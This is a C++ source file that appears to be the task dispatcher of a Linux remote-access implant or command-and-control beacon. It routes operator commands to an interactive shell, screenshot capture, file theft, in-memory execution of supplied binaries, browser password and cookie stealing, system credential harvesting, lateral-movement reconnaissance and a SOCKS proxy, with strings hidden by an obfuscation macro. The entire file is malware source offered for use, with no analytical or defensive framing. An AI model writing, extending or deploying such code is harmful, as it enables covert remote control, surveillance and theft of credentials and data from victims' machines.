#include "TaskDispatcher.h"
#include "Beacon.h"
#include "../recon/SysInfo.h"
#include "../recon/InstalledSoftware.h"
#include "../recon/LateralMovement.h"
#include "../wifi/WifiScanner.h"
#include "../credential/ChromiumStealer.h"
#include "../credential/FirefoxStealer.h"
#include "../credential/SystemCredentials.h"
#include "../capture/Screenshot.h"
#include "../capture/Audio.h"
#include "../capture/Webcam.h"
#include "../streaming/Streamer.h"
#include "../shell/InteractiveShell.h"
#include "../execution/InMemory.h"
#include "../utils/Shared.h"
#include "../fs/FileSystem.h"
#include "../recon/DeepRecon.h"
#include "../crypto/Base64.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include <stdexcept>
#include <sstream>
#include <filesystem>
#include <thread>

namespace beacon {
TaskDispatcher::TaskDispatcher(moodycamel::ConcurrentQueue<Result>& pendingResults) : pendingResults_(pendingResults) {}
void TaskDispatcher::dispatch(const Task& task) {
    Result result; result.task_id = task.task_id;
    try {
        switch (task.type) {
            case TaskType::SYSINFO: result.output = OBF("sysinfo:") + recon::getSysInfo(); break;
            case TaskType::INSTALLED_APPS: result.output = OBF("APPS_ENUM:") + recon::getInstalledSoftware(); break;
            case TaskType::ISHELL: {
                if (task.cmd == OBF("start")) {
                    auto cb = [this](const std::string& out) { Result r; r.task_id = OBF("ishell_out"); r.output = OBF("ISHELL_OUTPUT:\n") + out; this->pendingResults_.enqueue(r); };
                    shell::StartShell(cb); result.output = OBF("ISHELL_STATUS:Started");
                } else if (task.cmd == OBF("exit")) { shell::StopShell(); result.output = OBF("ISHELL_STATUS:Stopped"); }
                else { if (shell::IsShellRunning()) { shell::WriteToShell(task.cmd); result.output = OBF("ISHELL_OUTPUT:"); } else result.error = OBF("Not running"); }
                break;
            }
            case TaskType::SCREENSHOT: {
                auto img = capture::CaptureScreenshotJPEG();
                if (img.empty()) result.error = OBF("Failed"); else result.output = OBF("SCREENSHOT:") + crypto::Base64Encode(img);
                break;
            }
            case TaskType::BROWSE_FS: result.output = fs::Browse(task.cmd); break;
            case TaskType::FILE_DOWNLOAD: {
                auto data = fs::ReadFileBinary(task.cmd);
                if (data.empty()) result.error = OBF("Failed"); else result.output = OBF("FILE_DOWNLOAD:") + std::filesystem::path(task.cmd).filename().string() + ":" + crypto::Base64Encode(data);
                break;
            }
            case TaskType::EXECUTE_ASSEMBLY: {
                size_t colon = task.cmd.find(':');
                if (colon != std::string::npos) {
                    auto elf = crypto::Base64Decode(task.cmd.substr(0, colon));
                    result.output = execution::ExecuteInMemory(elf, task.cmd.substr(colon + 1));
                } else result.error = OBF("Invalid format");
                break;
            }
            case TaskType::WIFI_DUMP: {
                Result scanRes;
                scanRes.task_id = result.task_id + "_scan";
                scanRes.output = "WIFI_SCAN:" + wifi::scanAvailableWifi();
                pendingResults_.enqueue(scanRes);
                result.output = "WIFI_DUMP:Linux WiFi profiles dump not fully implemented";
                break;
            }
            case TaskType::BROWSER_PASS:
                result.output = "BROWSER_PASS:" + credential::DumpChromiumPasswords();
                result.output += "\n\n" + credential::DumpFirefoxPasswords();
                break;
            case TaskType::COOKIE_STEAL:
                result.output = "COOKIES:" + credential::StealFirefoxCookies();
                result.output += "\n\n" + credential::StealChromiumCookies();
                break;
            case TaskType::DEEP_RECON:
                result.output = recon::GetDeepRecon();
                break;
            case TaskType::SYS_CRED_HARVEST:
                result.output = credential::SystemCredentials::HarvestAll();
                break;
            case TaskType::LATERAL_RECON:
                result.output = recon::LateralMovement::RunLateralRecon();
                break;
            case TaskType::SOCKS_PROXY: {
                if (task.cmd == OBF("stop")) {
                    m_socksProxy.Stop();
                    result.output = OBF("SOCKS:Stopped");
                } else {
                    int port = std::stoi(task.cmd);
                    if (m_socksProxy.Start(port)) result.output = OBF("SOCKS:Started on port ") + task.cmd;
                    else result.error = OBF("Failed to start SOCKS");
                }
                break;
            }
            default: result.error = OBF("Unsupported"); break;
        }
    } catch (const std::exception& e) { result.error = e.what(); }
    pendingResults_.enqueue(result);
}
}
